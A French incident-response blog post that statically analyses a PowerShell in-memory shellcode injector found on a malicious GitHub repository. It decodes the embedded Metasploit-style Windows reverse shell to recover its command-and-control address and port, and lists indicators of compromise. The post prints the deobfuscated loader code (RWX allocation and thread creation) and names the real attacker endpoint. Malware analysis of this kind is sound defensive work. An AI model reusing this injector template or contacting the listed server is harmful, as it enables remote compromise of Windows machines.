---
title: "Du tableau d'octets à l'adresse C2 : décoder un shellcode PowerShell"
date: 2026-09-07
authors:
  - corentin
tags:
  - reverse-engineering
  - shellcode
  - powershell
  - dfir
  - metasploit
  - threat-intelligence
excerpt: Sur le dépôt GitHub qui hébergeait la charge Linux d'une compromission, un fichier update.ps1 traînait à côté. Six lignes de PowerShell et un long tableau d'octets. Récit de la démarche suivie pour en sortir l'adresse du serveur de commande, et des deux pièges qui font tomber sur un mauvais port.
---

En investiguant la compromission d'un serveur de messagerie Zimbra, j'ai remonté la charge malveillante jusqu'à un dépôt GitHub qui servait de plateforme de distribution. Le contexte complet de cet incident fait l'objet d'un [article séparé](/blog/compromission-zimbra-swatchdog-injection-snmp/).

À côté du binaire Linux déposé sur le serveur, ce dépôt hébergeait un fichier `update.ps1`. Un script PowerShell n'a rien à faire dans une attaque visant une machine Linux. C'est ce décalage qui m'a poussé à l'ouvrir plutôt qu'à passer à la suite.

Le fichier tient en six lignes de code et un très long tableau d'octets. J'aurais pu m'arrêter au constat « script malveillant » et le mentionner comme tel dans le rapport. Le problème, c'est qu'un rapport d'incident qui affirme sans démontrer ne vaut pas grand-chose, et qu'un flux sortant à surveiller sans adresse à bloquer ne sert à rien aux administrateurs qui le lisent. Il me fallait l'adresse exacte, et une démarche que quelqu'un d'autre puisse refaire pour me contredire.

Voici comment j'ai procédé, y compris les deux endroits où je me suis trompé.

:::caution[Analyse statique uniquement]
Rien de ce qui suit n'exécute le shellcode. Le tableau d'octets est traité comme de la donnée, jamais chargé en mémoire ni lancé. Le travail a été fait sur une machine d'analyse isolée. Un shellcode qu'on exécute « juste pour voir » ouvre une connexion vers l'attaquant.
:::

## Six lignes qui ne cachent rien

Le conteneur PowerShell se lit en une minute. Voici sa version désobfusquée, les noms de variables aléatoires remplacés par des noms lisibles :

```powershell
# 1. Déclaration des API Windows via C# (P/Invoke)
$Win32Api = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
    uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
    IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);
"@

# 2. Compilation en mémoire pour rendre kernel32 accessible à PowerShell
$Kernel32 = Add-Type -memberDefinition $Win32Api -Name "Win32" `
    -namespace Win32Functions -passthru

# 3. La charge utile, sous forme de tableau d'octets
[Byte[]] $shellcode = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,...

# 4. Allocation d'une page mémoire en lecture / écriture / exécution
#    0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
$addr = $Kernel32::VirtualAlloc(0, [Math]::Max($shellcode.Length, 0x1000), 0x3000, 0x40)

# 5. Copie du tableau vers cette page
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)

# 6. Lancement d'un thread sur l'adresse de la page
$Kernel32::CreateThread(0, 0, $addr, 0, 0, 0)
```

Deux signaux suffisent à qualifier le script sans regarder la charge. L'allocation réclame la protection `0x40`, soit une page à la fois inscriptible et exécutable, combinaison qu'un programme légitime n'a presque jamais de raison de demander. Et rien ne touche le disque : le code s'exécute directement depuis la mémoire du processus PowerShell, ce qui explique qu'un antivirus travaillant sur les fichiers n'ait rien à se mettre sous la dent.

Le conteneur ne cache donc rien. Il alloue, copie, exécute. Toute la question tient dans le contenu de `$shellcode`.

## Sortir les octets du script

Tant que le tableau reste dans le fichier `.ps1`, c'est du texte. Pour l'attaquer avec des outils d'analyse, il faut le transformer en fichier binaire brut.

J'ai copié la valeur du tableau, sans le préfixe `[Byte[]] $shellcode =`, dans un fichier `payload.txt` au format `0xfc,0x48,0x83,...`, puis :

```bash
python3 -c "
data = open('payload.txt').read().strip()
parts = [p.strip() for p in data.split(',') if p.strip()]
bs = bytes(int(p, 16) for p in parts)
open('shellcode.bin', 'wb').write(bs)
print(len(bs), 'octets écrits')
"
```

Le compte d'octets affiché donne un premier contrôle de cohérence. Une charge Metasploit x64 non étagée de type reverse shell tourne autour de 460 octets. Un résultat très éloigné de cet ordre de grandeur aurait signalé une erreur de copie avant même le désassemblage.

Deuxième réflexe, calculer l'empreinte tout de suite :

```bash
sha256sum shellcode.bin
```

Ce n'est pas décoratif. L'empreinte rattache l'analyse à une pièce précise dans le dossier d'incident, permet de la comparer aux bases publiques de renseignement sur les menaces, et prouve plus tard que l'objet analysé est bien celui qui a été collecté.

## Le désassemblage, et ma première erreur

`objdump` sait traiter un fichier comme du code plat, sans en-tête ni sections, ce qui correspond exactement à un shellcode :

```bash
objdump -D -b binary -m i386:x86-64 -M intel shellcode.bin
```

| Option | Rôle |
|---|---|
| `-D` | Désassembler tout le contenu, sans chercher de section exécutable |
| `-b binary` | Traiter le fichier comme un flux d'octets bruts |
| `-m i386:x86-64` | Forcer l'architecture x64 |
| `-M intel` | Syntaxe Intel, plus lisible que la syntaxe AT&T |

Ma première sortie ressemblait à ça :

```asm
0:   0000    add    BYTE PTR [rax],al
2:   00fc    add    ah,bh
4:   0000    add    BYTE PTR [rax],al
6:   0008    add    BYTE PTR [rax],cl
```

Une cascade de `add BYTE PTR [rax],al`, qui est le désassemblage d'octets nuls. Le fichier contenait des `00` parasites en tête, hérités d'un collage approximatif, et ce décalage d'un octet suffisait à rendre tout le reste incohérent. Un shellcode se désassemble à partir d'un point d'entrée précis : décalé d'un seul octet, il ne veut plus rien dire.

Après nettoyage, la sortie devient parlante :

```asm
   0:   fc                      cld
   1:   48 83 e4 f0             and    rsp,0xfffffffffffffff0
   5:   e8 c0 00 00 00          call   0xca
   a:   41 51                   push   r9
   c:   41 50                   push   r8
   e:   52                      push   rdx
   f:   51                      push   rcx
  10:   56                      push   rsi
  11:   48 31 d2                xor    rdx,rdx
  14:   65 48 8b 52 60          mov    rdx,QWORD PTR gs:[rdx+0x60]
  19:   48 8b 52 18             mov    rdx,QWORD PTR [rdx+0x18]
  1d:   48 8b 52 20             mov    rdx,QWORD PTR [rdx+0x20]
```

Ce prologue est le `block_api` de Metasploit, reconnaissable au premier coup d'œil une fois qu'on l'a vu une fois. L'instruction `mov rdx, gs:[rdx+0x60]` lit le **PEB** (Process Environment Block) à travers le segment `gs`, puis parcourt `PEB->Ldr` et la liste `InMemoryOrderModuleList` pour retrouver l'adresse de `kernel32.dll` en mémoire. Les fonctions sont ensuite résolues par empreinte de leur nom, ce qui évite toute table d'import lisible statiquement.

Ce détail a son importance pour la défense : un outil qui cherche des noms d'API dans un binaire ne trouvera rien ici. Il n'y a pas de nom d'API à trouver.

## Trouver la configuration réseau

Un reverse shell TCP doit à un moment construire une structure `sockaddr_in` pour appeler `connect()`. Sur x64, le compilateur de shellcode charge les huit octets de cette structure en une seule instruction `movabs`. C'est la ligne à chercher, et elle se trouve en une commande dans une sortie de plusieurs centaines de lignes :

```bash
objdump -D -b binary -m i386:x86-64 -M intel shellcode.bin | grep -i movabs
```

Le résultat, à l'offset `0xe4` :

```asm
  e4:   49 bc 02 00 21 24 2b    movabs r12,0x499de42b24210002
  eb:   e4 9d 49
```

La structure `sockaddr_in` occupe justement 8 octets utiles :

```c
struct sockaddr_in {
    short   sin_family;       // 2 octets — AF_INET vaut 2
    u_short sin_port;         // 2 octets — en ordre réseau (gros-boutiste)
    struct in_addr sin_addr;  // 4 octets — en ordre réseau
};
```

Tout ce dont j'avais besoin tenait dans cette valeur de 64 bits.

## Décoder la valeur, et ma seconde erreur

La valeur `0x499de42b24210002` affichée par `objdump` est la lecture petit-boutiste des octets réellement présents dans le fichier. Remis dans l'ordre du fichier, ces octets sont :

```
02 00   21 24   2b e4 9d 49
```

Le découpage suit la structure :

| Octets | Champ | Interprétation |
|---|---|---|
| `02 00` | `sin_family` | `0x0002` en petit-boutiste, soit `AF_INET` (IPv4) |
| `21 24` | `sin_port` | déjà en ordre réseau : `0x2124` = **8484** |
| `2b e4 9d 49` | `sin_addr` | déjà en ordre réseau : **43.228.157.73** |

Pour l'adresse, chaque octet se convertit directement en décimal :

```
0x2b = 43
0xe4 = 228
0x9d = 157
0x49 = 73
```

Destination : `43.228.157.73:8484`.

Sauf que sur le port, j'ai d'abord sorti une autre valeur. Le raisonnement fautif était mécanique : « x86 est petit-boutiste, donc j'inverse ». En inversant `21 24` en `0x2421`, j'obtenais 9249. Rien dans le résultat ne signalait l'erreur, puisque 9249 reste un numéro de port parfaitement plausible. C'est le genre de faute qui part directement dans une règle de pare-feu et qui ne bloque rien.

L'explication tient en une phrase. Le port et l'adresse sont **déjà** stockés en ordre réseau, c'est-à-dire gros-boutiste, à l'intérieur de la structure `sockaddr_in`. La conversion petit-boutiste s'applique une seule fois, à l'immédiat de l'instruction `movabs`. Une fois les octets remis dans l'ordre du fichier, les champs se lisent tels quels. Inverser une seconde fois revient à défaire le travail.

Deuxième embûche du même genre, plus grossière mais tentante quand on manipule de l'hexadécimal toute la journée : convertir `0x2b` en texte donne `+`, parce que `0x2B` est la position du signe plus dans la table ASCII. Les octets d'une adresse IP ne sont pas des caractères.

| Lecture | Question posée | Résultat pour `0x2b` |
|---|---|---|
| ASCII | quel caractère la table associe-t-elle à cette valeur ? | `+` |
| Décimale | combien vaut `2×16 + 11` ? | `43` |

Reconstituer une adresse impose la seconde lecture.

## Vérifier plutôt que croire

Ayant déjà commis deux erreurs, je n'allais pas mettre une adresse dans un rapport d'incident sur la foi d'un calcul mental. La vérification indépendante tient en une commande, et refait tout le chemin depuis la valeur affichée par `objdump` :

```bash
python3 -c "
import socket, struct
val = 0x499de42b24210002
b = val.to_bytes(8, 'little')
print('octets  :', ' '.join(f'{x:02x}' for x in b))
print('famille :', struct.unpack('<H', b[0:2])[0])
print('port    :', struct.unpack('>H', b[2:4])[0])
print('adresse :', socket.inet_ntoa(b[4:8]))
"
```

Sortie :

```
octets  : 02 00 21 24 2b e4 9d 49
famille : 2
port    : 8484
adresse : 43.228.157.73
```

L'asymétrie entre le `<H` de la famille et le `>H` du port n'est pas un détail cosmétique. Elle traduit exactement la règle énoncée plus haut, et le fait d'avoir à l'écrire oblige à comprendre pourquoi les deux champs ne se lisent pas dans le même sens.

## Ce que fait le reste du shellcode

Une fois l'adresse tenue, le reste des instructions se lit sans difficulté. Le schéma est celui d'un `windows/x64/shell_reverse_tcp` classique :

1. Résolution de `ws2_32.dll` par la même méthode de parcours du PEB, puis appel de `WSAStartup` pour initialiser la pile réseau.
2. Création d'un socket TCP via `WSASocketA`.
3. Appel de `connect()` avec la structure `sockaddr_in` chargée dans `r12`.
4. Construction d'une structure `STARTUPINFOA` dans laquelle `hStdInput`, `hStdOutput` et `hStdError` pointent tous vers le descripteur du socket.
5. Appel de `CreateProcessA` sur `cmd.exe`, dont la chaîne apparaît en clair dans les octets terminaux (`63 6d 64 00`).

Un `strings -a shellcode.bin` confirme cette dernière étape en une seconde, `cmd` étant l'une des rares chaînes lisibles du binaire.

Résultat concret : la personne qui écoute sur `43.228.157.73:8484` obtient une invite de commande sur la machine victime, avec les privilèges du compte ayant exécuté le script.

## La démarche en cinq commandes

Une fois les tâtonnements retirés, tout tient dans un enchaînement court, reproductible par quiconque veut vérifier ou contredire l'analyse :

```bash
# 1. Tableau PowerShell → binaire
python3 -c "bs=bytes(int(p,16) for p in open('payload.txt').read().split(',') if p.strip()); \
open('shellcode.bin','wb').write(bs); print(len(bs))"

# 2. Empreinte, pour référencer la pièce dans le rapport
sha256sum shellcode.bin

# 3. Désassemblage
objdump -D -b binary -m i386:x86-64 -M intel shellcode.bin > shellcode.asm

# 4. Localisation de la structure réseau
grep -i movabs shellcode.asm

# 5. Chaînes lisibles restantes
strings -a shellcode.bin
```

## Ce que j'en retire

**L'analyse a changé le périmètre de l'incident.** Tant que le fichier restait « un script PowerShell suspect », il n'appelait aucune action. Avec une adresse et un port, il devient une recherche concrète dans les journaux du pare-feu et une règle de blocage sur le parc bureautique. La menace initiale visait un serveur Linux, l'attaquant avait déposé au même endroit de quoi opérer sur des machines Windows.

**Un résultat plausible n'est pas un résultat juste.** Mon erreur d'ordre des octets produisait un numéro de port crédible. Aucun signal ne m'aurait alerté. La seule protection a été de refaire le calcul par un chemin différent, avec un outil qui applique explicitement les conventions plutôt que ma mémoire des conventions.

**Une démarche vérifiable vaut mieux qu'une conclusion assurée.** J'ai publié les commandes plutôt que le seul résultat, pour que la personne qui lit le rapport puisse refaire le chemin. C'est ce qui distingue un élément de preuve d'une affirmation.

Je ne fais pas du reverse engineering au quotidien. La démarche décrite ici est celle d'un praticien qui a voulu comprendre ce qu'il avait sous les yeux au lieu de le classer sans l'ouvrir. Si des personnes dont c'est le métier repèrent une approximation ou une méthode plus directe, je suis preneur.

## Signalement et retrait du dépôt

Le 31 août 2026, j'ai signalé le dépôt à l'équipe Trust & Safety de GitHub dans la catégorie « logiciel malveillant activement exploité ». Le signalement décrivait les deux charges hébergées : le binaire Linux de minage et le script `update.ps1`. Pour que l'adresse du serveur de commande puisse être vérifiée sans me croire sur parole, j'ai joint la procédure de cet article : conversion du tableau en binaire, désassemblage avec `objdump`, puis lecture de l'instruction `movabs r12, 0x499de42b24210002` à l'offset `0xe4`.

Le 1er septembre 2026, GitHub a confirmé une violation de ses conditions d'utilisation et a supprimé le dépôt ainsi que le compte associé. La démarche reproductible a servi une seconde fois : elle a permis à un tiers de contrôler la conclusion avant d'agir.

## Indicateurs

```
43.228.157.73:8484   (C2 du reverse shell Windows)
update.ps1           (injecteur de shellcode en mémoire)
https://github.com/AlishaSharylz2/Windows-Update-Assistant   (hébergement, supprimé par GitHub le 1er septembre 2026)
```

## Sources

- [CERT-FR — CERTFR-2026-AVI-1041, Multiples vulnérabilités dans Synacor Zimbra Collaboration](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-1041/)
- [The Hacker News — Attackers Exploit Zimbra SNMP Flaw for Unauthenticated Remote Code Execution](https://thehackernews.com/2026/08/attackers-exploit-zimbra-snmp-flaw-for.html)
